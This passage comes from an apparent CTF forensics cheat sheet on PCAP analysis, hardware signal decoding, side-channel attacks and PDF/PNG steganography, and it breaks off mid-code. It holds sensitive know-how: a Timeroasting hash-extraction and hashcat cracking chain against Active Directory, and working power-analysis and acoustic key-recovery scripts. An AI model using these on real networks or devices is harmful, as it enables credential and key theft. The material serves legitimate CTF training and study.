- **APFS snapshot recovery:** Copy-on-write filesystem preserves historical file states in snapshots; use `icat` with different XID block offsets to read inodes across transaction IDs. See [disk-and-memory.md](disk-and-memory.md#apfs-snapshot-historical-file-recovery-srdnlenctf-2026).
- **Windows KAPE triage:** Pre-collected artifact ZIPs; start with PowerShell history → Amcache → MFT → registry hives. See [disk-and-memory.md](disk-and-memory.md#windows-kape-triage-analysis-utctf-2026).
- **WordPerfect macro XOR:** `.wcm` files contain macros with embedded encrypted data; XOR formula `(a+b)-2*(a&b)` = bitwise XOR. See [disk-and-memory.md](disk-and-memory.md#wordperfect-macro-xor-extraction-srdnlenctf-2026).
- **TLS master key from coredump:** Search coredump for session ID (from Wireshark handshake); read 48 bytes before it as master key. Create Wireshark pre-master-secret log file. See [network.md](network.md#tls-master-key-extraction-from-coredump-plaidctf-2014).
- **Corrupted git blob repair:** Single-byte corruption changes SHA-1; brute-force each byte position (256 × file_size) verifying with `git hash-object`. See [linux-forensics.md](linux-forensics.md#corrupted-git-blob-repair-via-byte-brute-force-csaw-ctf-2015).
- **Split archive reassembly from PCAP:** Same-sized HTTP-transferred files with MD5-hash names are archive fragments; order by Apache directory listing timestamps, concatenate, extract password from TCP chat stream. See [network.md](network.md#split-archive-reassembly-from-http-transfers-asis-ctf-finals-2013).
- **Video frame accumulation:** Video with flashing images at various positions; composite all frames (per-pixel maximum) reveals hidden QR code or image. See [stego-advanced.md](stego-advanced.md#video-frame-accumulation-for-hidden-image-asis-ctf-finals-2013).
- **Reversed audio:** Garbled audio that sounds like speech played backwards; `sox audio.wav reversed.wav reverse` or Audacity Effect → Reverse reveals hidden message. See [stego-advanced.md](stego-advanced.md#reversed-audio-hidden-message-asis-ctf-finals-2013).

## SMB RID Recycling via LSARPC (Midnight 2026)

Enumerate AD accounts from PCAP by analyzing LSARPC `LsaLookupSids` calls with sequential RIDs after Guest auth. Filter: `dcerpc.cn_bind_to_str contains lsarpc`.

See [network-advanced.md](network-advanced.md#smb-rid-recycling-via-lsarpc-midnight-2026) for full RPC call sequence and Wireshark filters.

## Timeroasting / MS-SNTP Hash Extraction (Midnight 2026)

Extract crackable HMAC-MD5 hashes from MS-SNTP responses by sending NTP requests with machine account RIDs. Crack with `hashcat -m 31300`.

```bash
# Extract NTP payloads, convert to hashcat format, crack
tshark -r capture.pcapng -Y "ntp && ip.src == <DC_IP>" -T fields -e udp.payload
hashcat -m 31300 -a 0 -O hashes.txt rockyou.txt --username
```

See [network-advanced.md](network-advanced.md#timeroasting--ms-sntp-hash-extraction-midnight-2026) for payload parsing script and full attack chain.

## HTTP Exfiltration in PCAP

**Quick path:** `tshark --export-objects http,/tmp/objects` extracts uploaded files instantly. Check for multipart POST uploads, unusual User-Agent strings, and exfiltrated files (images with flag text). See [network.md](network.md#http-file-upload-exfiltration-in-pcap-metactf-2026).

## Common Encodings

```bash
echo "base64string" | base64 -d
echo "hexstring" | xxd -r -p
# ROT13: tr 'A-Za-z' 'N-ZA-Mn-za-m'
```

**ROT18:** ROT13 on letters + ROT5 on digits. Common final layer in multi-stage forensics. See [linux-forensics.md](linux-forensics.md) for implementation.



---

<!-- Source: signals-and-hardware.md -->

# CTF Forensics - Signals and Hardware

## Table of Contents
- [VGA Signal Decoding](#vga-signal-decoding)
- [HDMI TMDS Decoding](#hdmi-tmds-decoding)
- [DisplayPort 8b/10b + LFSR Decoding](#displayport-8b10b--lfsr-decoding)
- [Voyager Golden Record Audio (0xFun 2026)](#voyager-golden-record-audio-0xfun-2026)
- [Side-Channel Power Analysis (EHAX 2026)](#side-channel-power-analysis-ehax-2026)
- [Saleae Logic 2 UART Decode (EHAX 2026)](#saleae-logic-2-uart-decode-ehax-2026)
- [Flipper Zero .sub File (0xFun 2026)](#flipper-zero-sub-file-0xfun-2026)
- [Keyboard Acoustic Side-Channel (ApoorvCTF 2026)](#keyboard-acoustic-side-channel-apoorvctf-2026)
- [POCSAG Pager Decoding via GQRX → sox → multimon-ng (404CTF 2025)](#pocsag-pager-decoding-via-gqrx--sox--multimon-ng-404ctf-2025)
- [IQ File FFT Masking (out-of-band filter, 404CTF 2025 "Trop d'IQ")](#iq-file-fft-masking-out-of-band-filter-404ctf-2025-trop-diq)
- [PulseView I2C Decoder + Datasheet (404CTF 2025 "Comment est votre température")](#pulseview-i2c-decoder--datasheet-404ctf-2025-comment-est-votre-température)
- [Op-Amp Flash ADC Recovery from Schematic (404CTF 2025 "R16D4")](#op-amp-flash-adc-recovery-from-schematic-404ctf-2025-r16d4)

---

## VGA Signal Decoding

**Frame structure:** 800x525 total (640x480 active + blanking). Each sample = 5 bytes: R, G, B, HSync, VSync. Color is 6-bit (0-63).

```python
import numpy as np
from PIL import Image

data = open('vga.bin', 'rb').read()

TOTAL_W, TOTAL_H = 800, 525
ACTIVE_W, ACTIVE_H = 640, 480
BYTES_PER_SAMPLE = 5  # R, G, B, hsync, vsync

# Parse raw samples
samples = np.frombuffer(data, dtype=np.uint8).reshape(-1, BYTES_PER_SAMPLE)
frame = samples.reshape(TOTAL_H, TOTAL_W, BYTES_PER_SAMPLE)

# Extract active region, scale 6-bit to 8-bit
active = frame[:ACTIVE_H, :ACTIVE_W, :3]  # RGB only
img_arr = (active.astype(np.uint16) * 4).clip(0, 255).astype(np.uint8)
Image.fromarray(img_arr).save('vga_output.png')
```

**Key lesson:** Total frame > visible area — always crop blanking. If colors look dark, check if 6-bit (multiply by 4).

---

## HDMI TMDS Decoding

**Structure:** 3 channels (R, G, B), each encoded as 10-bit TMDS (Transition-Minimized Differential Signaling) symbols. Bit 9 = inversion flag, bit 8 = XOR/XNOR mode. Decode is deterministic from MSBs down.

```python
def tmds_decode(symbol_10bit):
    """Decode a 10-bit TMDS symbol to 8-bit pixel value."""
    bits = [(symbol_10bit >> i) & 1 for i in range(10)]
    # bits[9] = inversion flag, bits[8] = XOR/XNOR mode

    # Step 1: undo optional inversion (bit 9)
    if bits[9]:
        d = [1 - bits[i] for i in range(8)]
    else:
        d = [bits[i] for i in range(8)]

    # Step 2: undo XOR/XNOR chain (bit 8 selects mode)
    q = [d[0]]
    if bits[8]:
        for i in range(1, 8):
            q.append(d[i] ^ q[i-1])        # XOR mode
    else:
        for i in range(1, 8):
            q.append(d[i] ^ q[i-1] ^ 1)    # XNOR mode

    return sum(q[i] << i for i in range(8))

# Parse: read 10-bit symbols from binary, group into 3 channels
# Frame is 800x525 total, crop to 640x480 active
```

**Identification:** Binary data with 10-bit aligned structure. Challenge mentions HDMI, DVI, or TMDS.

---

## DisplayPort 8b/10b + LFSR Decoding

**Structure:** 10-bit 8b/10b symbols decoded to 8-bit data, then LFSR-descrambled. Organized in 64-column Transport Units (60 data columns + 4 overhead).

```python
# Standard 8b/10b decode table (partial — full table has 256 entries)
# Use a prebuilt table: map 10-bit symbol -> 8-bit data
# Key: running disparity tracks DC balance

# LFSR descrambler (x^16 + x^5 + x^4 + x^3 + 1)
def lfsr_descramble(data):
    """DisplayPort LFSR descrambler. Resets on control symbols (BS/BE)."""
    lfsr = 0xFFFF  # Initial state
    result = []
    for byte in data:
        out = byte
        for bit_idx in range(8):
            feedback = (lfsr >> 15) & 1
            out ^= (feedback << bit_idx)
            new_bit = ((lfsr >> 15) ^ (lfsr >> 4) ^ (lfsr >> 3) ^ (lfsr >> 2)) & 1
            lfsr = ((lfsr << 1) | new_bit) & 0xFFFF
        result.append(out & 0xFF)
    return bytes(result)

# Transport Unit layout: 64 columns per TU
# Columns 0-59: pixel data (RGB)
# Columns 60-63: overhead (sync, stuffing)
# LFSR resets on control bytes (BS=0x1C, BE=0xFB)
```

**Key lesson:** LFSR scrambler resets on control bytes — identify these to synchronize descrambling. Without reset points, output is garbled.

---

## Voyager Golden Record Audio (0xFun 2026)

**Pattern (11 Lines of Contact):** Analog image encoded as audio. Sync pulses (sharp negative spikes) delimit scan lines. Amplitude between pulses = pixel brightness.

```python
import numpy as np
from scipy.io import wavfile
from PIL import Image

rate, audio = wavfile.read('golden_record.wav')
audio = audio.astype(np.float32)

# Find sync pulses (sharp negative spikes below threshold)
threshold = np.min(audio) * 0.7
sync_indices = np.where(audio < threshold)[0]

# Group consecutive sync samples into pulse starts
pulses = [sync_indices[0]]
for i in range(1, len(sync_indices)):
    if sync_indices[i] - sync_indices[i-1] > 100:
        pulses.append(sync_indices[i])

# Extract scan lines between pulses, resample to fixed width
WIDTH = 512
lines = []
for i in range(len(pulses) - 1):
    line = audio[pulses[i]:pulses[i+1]]
    resampled = np.interp(np.linspace(0, len(line)-1, WIDTH), np.arange(len(line)), line)
    lines.append(resampled)

# Normalize and save as image
img_arr = np.array(lines)
img_arr = ((img_arr - img_arr.min()) / (img_arr.max() - img_arr.min()) * 255).astype(np.uint8)
Image.fromarray(img_arr).save('voyager_image.png')
```

---

## Side-Channel Power Analysis (EHAX 2026)

**Pattern (Power Leak):** Power consumption traces recorded during cryptographic operations. Correct key guesses cause measurably different power consumption at specific sample points.

**Data format:** Typically a multi-dimensional array: `[positions × guesses × traces × samples]`. E.g., 6 digit positions × 10 guesses (0-9) × 20 traces × 50 samples.

**Attack (Differential Power Analysis):**
```python
import numpy as np
import hashlib

# Load power traces: shape = (positions, guesses, traces, samples)
data = np.load('power_traces.npy')  # or parse from CSV/JSON
n_positions, n_guesses, n_traces, n_samples = data.shape

# For each position, find the guess with maximum power at the leak point
key_digits = []
for pos in range(n_positions):
    # Average across traces for each guess
    avg_power = data[pos].mean(axis=1)  # shape: (guesses, samples)

    # Find the sample point with maximum power variance across guesses
    # This is the "leak point" where the correct guess stands out
    variance_per_sample = avg_power.var(axis=0)
    leak_sample = np.argmax(variance_per_sample)

    # The guess with maximum power at the leak point is correct
    best_guess = np.argmax(avg_power[:, leak_sample])
    key_digits.append(best_guess)

key = ''.join(str(d) for d in key_digits)
print(f"Recovered key: {key}")

# Flag may be SHA256 of the key
flag = hashlib.sha256(key.encode()).hexdigest()
```

**Identification:** Challenge mentions "power", "side-channel", "leakage", "traces", or "measurements". Data is a multi-dimensional numeric array with axes for positions/guesses/traces/samples.

**Key insight:** The "leak point" is the sample index where correct vs incorrect guesses show the largest power difference. Average across traces first to reduce noise, then find the sample with maximum variance across guesses.

---

## Saleae Logic 2 UART Decode (EHAX 2026)

**Pattern (Baby Serial):** Saleae Logic 2 `.sal` file (ZIP archive) containing digital channel captures. Data encoded as UART serial.

**File structure:** `.sal` is a ZIP containing `digital-0.bin` through `digital-7.bin` + `meta.json`. Only channel 0 typically has data.

**Binary format (digital-*.bin):**
```text
<SALEAE> magic (8 bytes)
version: u32 = 2
type: u32 = 100 (digital)
initial_state: u32 (0 or 1)
... header fields ...
Delta-encoded transitions (variable-length integers)
```

**Delta encoding:** Each value represents the number of samples between state transitions. The signal alternates between HIGH and LOW at each delta.

**UART decode from deltas:**
```python
import numpy as np

# Parse deltas from binary (after header)
# Reconstruct signal timeline
times = np.cumsum(deltas)
states = []
state = initial_state
for d in deltas:
    states.append(state)
    state ^= 1  # toggle on each transition

# UART decode: detect start bit (HIGH→LOW), sample 8 data bits at bit centers
# Baud rate detection: most common delta ≈ samples_per_bit
# At 1MHz sample rate: 115200 baud ≈ 8.7 samples/bit

def uart_decode(transitions, sample_rate=1_000_000, baud=115200):
    bit_period = sample_rate / baud
    bytes_out = []
    i = 0
    while i < len(transitions):
        # Find start bit (falling edge)
        if transitions[i] == 0:  # LOW = start bit
            byte_val = 0
            for bit in range(8):
                sample_time = (1.5 + bit) * bit_period  # center of each bit
                # Sample signal at this offset from start bit
                bit_val = get_signal_at(sample_time)
                byte_val |= (bit_val << bit)  # LSB first
            bytes_out.append(byte_val)
        i += 1
    return bytes(bytes_out)
```

**Common pitfalls:**
- **Inverted polarity:** UART idle is HIGH (mark). If initial_state=1, the encoding may be inverted — try both
- **Baud rate guessing:** Check common rates: 9600, 19200, 38400, 57600, 115200, 230400
- **Output format:** Decoded bytes may be base64-encoded (containing a PNG image or text)
- **Saleae internal format ≠ export format:** The `.sal` internal binary uses a different encoding than CSV/binary export. Parse the raw delta transitions directly

**Quick approach:** Install Saleae Logic 2, open the `.sal` file, add UART analyzer with auto-baud detection, export decoded data.

---

## Flipper Zero .sub File (0xFun 2026)

RAW_Data binary -> filter noise bytes (0x80-0xFF) -> expand batch variable references -> XOR with hint text.

---

## Keyboard Acoustic Side-Channel (ApoorvCTF 2026)

**Pattern (Author on the Run):** Recover typed text from audio recordings of keystrokes. Reference audio provides labeled samples (known keys), flag audio contains unknown keystrokes to classify.

**Step 1 — Detect keystrokes via energy peaks:**
```python
import numpy as np
from scipy.signal import find_peaks
from scipy.io import wavfile

sr, audio = wavfile.read('flag.wav')
if audio.ndim > 1:
    audio = audio.mean(axis=1)

# Sliding window energy envelope (10ms window)
win = int(0.01 * sr)
energy = np.array([np.sum(audio[i:i+win]**2) for i in range(0, len(audio) - win, win)])

# Find peaks with minimum 175ms separation
min_dist = int(0.175 * sr / win)
peaks, _ = find_peaks(energy, height=0.03 * energy.max(), distance=min_dist)
```

**Step 2 — Extract MFCC features per keystroke:**
```python
import librosa

def extract_features(audio, sr, peak_sample, window_ms=10):
    win = int(window_ms / 1000 * sr)
    start = max(0, peak_sample - win // 2)
    segment = audio[start:start + win]
    mfccs = librosa.feature.mfcc(y=segment.astype(float), sr=sr, n_mfcc=20)
    return np.concatenate([mfccs.mean(axis=1), mfccs.std(axis=1)])  # 40-dim
```

**Step 3 — Classify with KNN against labeled reference:**
```python
from sklearn.neighbors import KNeighborsClassifier

# Build reference from labeled audio (26 keys × 50 presses each)
X_ref, y_ref = [], []
for key_idx, key in enumerate('abcdefghijklmnopqrstuvwxyz'):
    for peak in reference_peaks[key_idx * 50:(key_idx + 1) * 50]:
        X_ref.append(extract_features(ref_audio, sr, peak))
        y_ref.append(key)

knn = KNeighborsClassifier(n_neighbors=5)
knn.fit(X_ref, y_ref)

# Classify flag keystrokes
flag = ''.join(knn.predict([extract_features(flag_audio, sr, p) for p in flag_peaks]))
```

**Key insight:** Window size is critical — 10ms captures the initial impact transient which is most distinctive per key. Larger windows (20-30ms) include key release noise that reduces classification accuracy. Use all individual reference samples rather than averaging, as KNN handles variance better with more data points.

**Detection:** Two audio files provided (reference + target), or challenge mentions "typing", "keyboard", "acoustic".

---

## POCSAG Pager Decoding via GQRX → sox → multimon-ng (404CTF 2025)

**Pattern:** challenge gives an IQ capture (or live SDR feed) of a narrowband FM pager channel (typically 137–169 MHz or 448 MHz). Decode chain:

```bash
# 1) GQRX demodulates FM and sends raw audio to UDP (Settings → Audio → UDP sink, localhost:7355)
# 2) sox converts that UDP stream to 22050 Hz mono signed 16-bit PCM for multimon-ng
nc -l -u 7355 | sox -t raw -r 48000 -e signed -b 16 -c 1 - -t raw -r 22050 -e signed -b 16 -c 1 - \
  | multimon-ng -t raw -a POCSAG512 -a POCSAG1200 -a POCSAG2400 -f alpha /dev/stdin
```

Key flags:
- `-a POCSAG512/1200/2400` — try all three baud rates (challenge doesn't tell you).
- `-f alpha` — alphanumeric mode so text flag appears in place of numeric codewords.

**Offline version** (IQ file → WAV → decode):
```bash
# Demodulate NFM with csdr or GNU Radio, output 22050 Hz mono WAV
csdr convert_u8_f < iq.bin | csdr fmdemod_quadri_cf | csdr limit_ff \
    | csdr fractional_decimator_ff 2.1768707 | csdr deemphasis_nfm_ff 22050 \
    | sox -t raw -r 22050 -e float -b 32 -c 1 - out.wav
multimon-ng -a POCSAG1200 -f alpha out.wav
```

**Spot signal:** narrow (~12.5 kHz) channel, chirpy "pager tones" audible, 1200 bps square-wave morphology on a waterfall.

Source: [acmo0.org/2025-06-01-404CTF-2025-Hardware-Writeup](https://www.acmo0.org/2025-06-01-404CTF-2025-Hardware-Writeup/).

---

## IQ File FFT Masking (out-of-band filter, 404CTF 2025 "Trop d'IQ")

**Pattern:** you get a complex IQ file (`complex64` or `complex128`) where the payload lives in a narrow band — audio voice or digital chirp — but the capture is polluted by noise at higher/lower frequencies. Classic: zero out unwanted FFT bins, inverse-FFT, listen/demod.

```python
import numpy as np, scipy.io.wavfile as wav
iq = np.fromfile('capture.iq', dtype=np.complex128)    # or complex64
fs = 48000                                              # sample rate

X = np.fft.fft(iq)
freqs = np.fft.fftfreq(len(iq), 1/fs)

# Keep only 300 Hz .. 3 kHz (voice band); zero everything else
mask = (np.abs(freqs) >= 300) & (np.abs(freqs) <= 3000)
X[~mask] = 0

clean = np.fft.ifft(X).real
clean = np.int16(clean / np.max(np.abs(clean)) * 32767)
wav.write('voice.wav', fs, clean)
```

For "remove upper half of FFT" (the 404CTF instance): set `X[len(X)//2:] = 0` before ifft — effectively a 22 kHz low-pass on a 44 kHz-sampled IQ.

**Extension:** if payload is digital (BPSK/FSK) in-band, after masking use `numpy.angle` / `scipy.signal.hilbert` then thresholding for bit recovery.

---

## PulseView I2C Decoder + Datasheet (404CTF 2025 "Comment est votre température")

**Pattern:** logic analyser trace (`.sr` / `.srzip` / Saleae `.logicdata`) shows I²C traffic between MCU and a sensor. Flag is encoded in the sensor's measurements — you must decode both the protocol and the sensor's response format.

**Workflow:**
1. Open the capture in PulseView (`pulseview capture.sr`).
2. Assign **I2C** protocol decoder → set `SCL` / `SDA` channels → view decoded frames.
3. Identify sensor from the I²C address (e.g. `0x44` → SHT40 family; `0x48` → LM75; `0x76/0x77` → BME280).
4. Pull the datasheet. Map command bytes to measurements:
   - SHT40: `0xFD` → high-precision measurement (returns 6 bytes: T_msb T_lsb CRC RH_msb RH_lsb CRC)
   - Convert: `T_degC = -45 + 175 * raw_T / 65535`, `RH = -6 + 125 * raw_RH / 65535`.
5. String the decoded measurement series into ASCII/bits/characters per the challenge hint.

**CLI alternative (sigrok-cli):**
```bash
sigrok-cli -i capture.sr -P i2c:scl=D0:sda=D1 -A i2c=data-read,data-write,address-read,address-write
```

**Key lesson:** PulseView does the protocol layer; the *datasheet* does the semantic layer. Never skip the datasheet — flag often encodes in the exact scaling formula.

---

## Op-Amp Flash ADC Recovery from Schematic (404CTF 2025 "R16D4")

**Pattern:** schematic shows a stack of identical op-amps, each wired as a **comparator** against a voltage-divider reference, outputs feeding into a priority encoder or directly sampled by an MCU. This is a classic **flash ADC** — `N` comparators quantise an input into `log2(N+1)` bits.

**Recovery steps:**
1. Count comparators (N). Flash ADC width is typically `ceil(log2(N+1))`.
2. Compute per-comparator reference: `V_ref_i = V_cc * i / (N+1)` (resistor ladder).
3. For each input sample: count how many comparators are at `V_cc` (high) — that count, divided by `V_cc/(N+1)`, gives the quantised integer.
4. The MCU firmware or Arduino code usually reads the encoder output → match the pin order to reconstruct the bit pattern.

**Worked example (N=15, 4-bit):**
```
V_cc = 5 V, 15 comparators at 5/16, 10/16, ..., 75/16 V
Input = 2.0 V → comparators 1..6 high (6/16 * 5 = 1.875 V threshold crossed, 7th at 2.19 V not)
Raw value = 6 (4-bit)
```

**Spot signal:** schematic with N ≈ 2^k - 1 op-amps sharing a common input node and distinct reference taps from a resistor ladder; Arduino sketch that reads a parallel port and looks it up in a small ROM table.

**Datasheet tie-in:** LM339 / LM393 (quad comparators) are the dead giveaway. MAX152 / MAX1106 are integrated 8-bit flash ADCs that follow the same math if the challenge uses an IC instead of discrete op-amps.

## TVLA / Welch-t Leakage Assessment (source: ChipWhisperer + modern side-channel CTFs)

**Trigger:** power/EM traces provided; challenge asks "does this implementation leak" or gives two trace-sets (fixed-key vs random-key, or fixed-plaintext vs random-plaintext).
**Signals:** `.npy` / `.bin` / `.trs` file with N × T samples; filename mentions `fixed_vs_random`, `tvla`, `key_t`, `key_r`; README references Goodwill et al. NIST TVLA methodology.
**Mechanic:** Welch's *t*-test per time sample — if `|t| > 4.5` for any sample, the set pair is leaking at 99.999 % confidence. Sample-complexity scales as `O(SNR^-2)`, so a clean 10k-trace set often wins where 1k fails.

```python
import numpy as np
# traces_f, traces_r : np.ndarray, shape (N_traces, N_samples)
def welch_t(a, b):
    ma, mb = a.mean(0), b.mean(0)
    va, vb = a.var(0, ddof=1), b.var(0, ddof=1)
    return (ma - mb) / np.sqrt(va / a.shape[0] + vb / b.shape[0])
t = welch_t(traces_f, traces_r)
leak_idx = np.where(np.abs(t) > 4.5)[0]     # time samples that leak
```

**Second-order:** center each trace (subtract mean), square, then re-run Welch — catches masked implementations where first-order TVLA is flat but the variance still leaks.

**CPA after TVLA:** once leakage localised, pivot to Correlation Power Analysis (Pearson ρ between hypothesis Hamming-weight(sbox output) and trace value). Libraries: `scared`, `lascar`, `estraces`.

## Morphology-Over-Duration Side-Channel (source: 404CTF 2024 Sea Side Channel + CSIDH)

**Trigger:** implementation uses "constant-time" APIs (`memcmp_ct`, `mpz_powm_sec`) yet leaks; traces have equal **length** but visibly different **shape** under a microscope.
**Signals:** waveforms all same length → naive timing attack fails; challenge provides a scope capture at ≥ 100 MS/s per op.
**Mechanic:** don't compare total time — compare per-window morphology (min, max, mean, autocorrelation, FFT bins) in a sliding window of 1-10 ops. Cluster by k-means on the 4D feature vector. The two clusters correspond to the two secret-bit values. Effective on CSIDH isogeny chains, constant-time Curve25519 ladders with subnormal paths, and SM2 / SM9 Chinese curves.

## CPA on AES-TinyAES / MBED Hamming-Weight

**Trigger:** traces labelled with known plaintexts; target is AES-128 first round; platform STM32 / ATMega.
**Signal:** 5000-10000 traces, 10-50k samples each, plaintext in a separate `.npy`.
**Mechanic:** CPA on Hamming weight of `sbox(p ⊕ k)` for each byte position:

```python
from scipy.stats import pearsonr
hw = bytes.fromhex("0001010201020203…" * 32)  # precomputed HW of 0..255
def cpa(traces, plaintexts, byte_pos):
    correlations = np.zeros((256, traces.shape[1]))
    for k in range(256):
        h = np.array([hw[AES_SBOX[p[byte_pos] ^ k]] for p in plaintexts])
        correlations[k] = np.array([pearsonr(h, traces[:, t])[0]
                                    for t in range(traces.shape[1])])
    return correlations.max(1).argmax()  # best key guess
```

Expect one key byte in < 1s on 10k traces; loop over 16 byte positions.



---

<!-- Source: steganography-2.md -->

# CTF Forensics - Steganography (2024-2026)

Modern image / PDF / multi-format stego from 2024-2026. For the canonical toolbox (binary border, RuCTF JPEG thumbnail, GIF differential, GZSteg), see [steganography.md](steganography.md).

## Table of Contents
- [Multi-Layer PDF Steganography (Pragyan 2026)](#multi-layer-pdf-steganography-pragyan-2026)
- [Advanced PDF Steganography (Nullcon 2026 rdctd series)](#advanced-pdf-steganography-nullcon-2026-rdctd-series)
- [SVG Animation Keyframe Steganography (UTCTF 2024)](#svg-animation-keyframe-steganography-utctf-2024)
- [PNG Chunk Reordering (0xFun 2026)](#png-chunk-reordering-0xfun-2026)
- [File Format Overlays (0xFun 2026)](#file-format-overlays-0xfun-2026)
- [Nested PNG with Iterating XOR Keys (VuwCTF 2025)](#nested-png-with-iterating-xor-keys-vuwctf-2025)
- [JPEG Unused Quantization Table LSB Steganography (EHAX 2026)](#jpeg-unused-quantization-table-lsb-steganography-ehax-2026)
- [BMP Bitplane QR Code Extraction + Steghide (BYPASS CTF 2025)](#bmp-bitplane-qr-code-extraction--steghide-bypass-ctf-2025)
- [Image Jigsaw Puzzle Reassembly via Edge Matching (BYPASS CTF 2025)](#image-jigsaw-puzzle-reassembly-via-edge-matching-bypass-ctf-2025)
- [F5 JPEG DCT Coefficient Ratio Detection (ApoorvCTF 2026)](#f5-jpeg-dct-coefficient-ratio-detection-apoorvctf-2026)
- [PNG Unused Palette Entry Steganography (ApoorvCTF 2026)](#png-unused-palette-entry-steganography-apoorvctf-2026)
- [QR Code Tile Reconstruction (UTCTF 2026)](#qr-code-tile-reconstruction-utctf-2026)
- [Seed-Based Pixel Permutation + Multi-Bitplane QR (L3m0nCTF 2025)](#seed-based-pixel-permutation--multi-bitplane-qr-l3m0nctf-2025)

---

## Multi-Layer PDF Steganography (Pragyan 2026)

**Pattern (epstein files):** Flag hidden across multiple layers in a PDF.

**Layer checklist:**
1. `strings file.pdf | grep -i hidden` -- hidden comments in PDF objects
2. Extract hex strings, try XOR with theme-related keywords
3. Check bytes **after `%%EOF`** marker -- may contain GPG/encrypted data
4. Try ROT18 (ROT13 on letters + ROT5 on digits) as final decode layer

```bash
# Extract post-EOF data
python3 -c "
data = open('file.pdf','rb').read()
eof = data.rfind(b'%%EOF')
print(data[eof+5:].hex())
"
```

---

## Advanced PDF Steganography (Nullcon 2026 rdctd series)

Six distinct hiding techniques in a single PDF:

**1. Invisible text separators:** Underscores rendered as invisible line segments. Extract with `pdftotext -layout` and normalize whitespace to underscores.

**2. URI annotations with escaped braces:** Link annotations contain flag in URI with `\{` and `\}` escapes:
```python
import pikepdf
pdf = pikepdf.Pdf.open(pdf_path)
for page in pdf.pages:
    for annot in (page.get("/Annots") or []):
        obj = annot.get_object()
        if obj.get("/Subtype") == pikepdf.Name("/Link"):
            uri = str(obj.get("/A").get("/URI")).replace(r"\{", "{").replace(r"\}", "}")
            # Check for flag pattern
```

**3. Blurred/redacted image with Wiener deconvolution:**
```python
from skimage.restoration import wiener
import numpy as np

def gaussian_psf(sigma):
    k = int(sigma * 6 + 1) | 1
    ax = np.arange(-(k//2), k//2 + 1, dtype=np.float32)
    xx, yy = np.meshgrid(ax, ax)
    psf = np.exp(-(xx**2 + yy**2) / (2 * sigma * sigma))
    return psf / psf.sum()

img_arr = np.asarray(img.convert("L")).astype(np.float32) / 255.0
deconv = wiener(img_arr, gaussian_psf(3.0), balance=0.003, clip=False)
```

**4. Vector rectangle QR code:** Hundreds of tiny filled rectangles (e.g., 1.718x1.718 units) forming a QR code. Parse PDF content stream for `re` operators, extract centers, render as grid, decode with `zbarimg`.

**5. Compressed object streams:** Use `mutool clean -d -c -m input.pdf output.pdf` to decompress all streams, then `strings` to search.

**6. Document metadata:** Check Producer, Author, Keywords fields: `pdfinfo doc.pdf` or `exiftool doc.pdf`.

**Official writeup details (Nullcon 2026 rdctd 1-6):**
- **rdctd 1:** Flag is visible in plain text (Section 3.4)
- **rdctd 2:** Flag in hyperlink URI with escaped braces (`\{`, `\}`)
- **rdctd 3:** LSB stego in Blue channel, **bit plane 5** (not bit 0!). Use `zsteg` with all planes: `zsteg -a extracted.ppm | grep ENO`
- **rdctd 4:** QR code hidden under black redaction box. Use Master PDF Editor to remove the box, scan QR
- **rdctd 5:** Flag in FlateDecode compressed stream (not visible with `strings`):
  ```python
  import re, zlib
  pdf = open('file.pdf', 'rb').read()
  for s in re.findall(b'stream[\r\n]+(.*?)[\r\n]+endstream', pdf, re.S):
      try:
          dec = zlib.decompress(s)
          if b'ENO{' in dec: print(dec)
      except: pass
  ```
- **rdctd 6:** Flag in `/Producer` metadata field

**Comprehensive PDF flag hunt checklist:**
1. `strings -a file.pdf | grep -o 'FLAG_FORMAT{[^}]*}'`
2. `exiftool file.pdf` (all metadata fields)
3. `pdfimages -all file.pdf img` + `zsteg -a img-*.ppm`
4. Open in PDF editor, check for overlay/redaction boxes hiding content
5. Decompress FlateDecode streams and search
6. Parse link annotations for URIs with escaped characters
7. `mutool clean -d file.pdf clean.pdf && strings clean.pdf`

---

## SVG Animation Keyframe Steganography (UTCTF 2024)

**Pattern (Insanity Check):** SVG favicon contains animation keyframes with alternating fill colors.

**Encoding:** `#FFFF` = 1, `#FFF6` = 0. Timing intervals (~0.314s or 3x0.314s) encode Morse code dots/dashes.

**Detection:** SVG files with `<animate>` tags, `keyTimes`/`values` attributes. Check favicon.svg and other vector assets. Two-value alternation patterns encode binary or Morse.

---

## PNG Chunk Reordering (0xFun 2026)

**Pattern (Spectrum):** Invalid PNG has chunks out of order.

**Fix:** Reorder to: `signature + IHDR + (ancillary chunks) + (all IDAT in order) + IEND`.

```python
import struct

with open('broken.png', 'rb') as f:
    data = f.read()

sig = data[:8]
chunks = []
pos = 8
while pos < len(data):
    length = struct.unpack('>I', data[pos:pos+4])[0]
    chunk_type = data[pos+4:pos+8]
    chunk_data = data[pos+8:pos+8+length]
    crc = data[pos+8+length:pos+12+length]
    chunks.append((chunk_type, length, chunk_data, crc))
    pos += 12 + length

# Sort: IHDR first, IEND last, IDATs in original order
ihdr = [c for c in chunks if c[0] == b'IHDR']
idat = [c for c in chunks if c[0] == b'IDAT']
iend = [c for c in chunks if c[0] == b'IEND']
other = [c for c in chunks if c[0] not in (b'IHDR', b'IDAT', b'IEND')]

with open('fixed.png', 'wb') as f:
    f.write(sig)
    for typ, length, data, crc in ihdr + other + idat + iend:
        f.write(struct.pack('>I', length) + typ + data + crc)
```

---

## File Format Overlays (0xFun 2026)

**Pattern (Pixel Rehab):** Archive appended after PNG IEND, but magic bytes overwritten with PNG signature.

**Detection:** Check bytes after IEND for appended data. Compare magic bytes against known formats.

```python
# Find IEND, check what follows
data = open('image.png', 'rb').read()
iend_pos = data.find(b'IEND') + 8  # After IEND + CRC
trailer = data[iend_pos:]
# Replace first 6 bytes with 7z magic if they match PNG sig
if trailer[:4] == b'\x89PNG':
    trailer = b'\x37\x7a\xbc\xaf\x27\x1c' + trailer[6:]
    open('hidden.7z', 'wb').write(trailer)
```

---

## Nested PNG with Iterating XOR Keys (VuwCTF 2025)

**Pattern (Matroiska):** Each PNG layer XOR-encrypted with incrementing keys ("layer2", "layer3", etc.).

**Identification:** Matryoshka/nested hints. Try incrementing key patterns for recursive extraction.

---

## JPEG Unused Quantization Table LSB Steganography (EHAX 2026)

**Pattern (Jpeg Soul):** "Insignificant" hint points to least significant bits in JPEG quantization tables (DQT). JPEG can embed DQT tables (ID 2, 3) that are never referenced by frame markers — invisible to renderers but carry hidden data.

**Detection:** JPEG has more DQT tables than components reference. Standard JPEG uses 2 tables (luminance + chrominance); extra tables with IDs 2, 3 are suspicious.

```python
from PIL import Image

img = Image.open('challenge.jpg')

# Access quantization tables (PIL exposes them as dict)
# Standard: tables 0 (luminance) and 1 (chrominance)
# Hidden: tables 2, 3 (unreferenced by SOF marker)
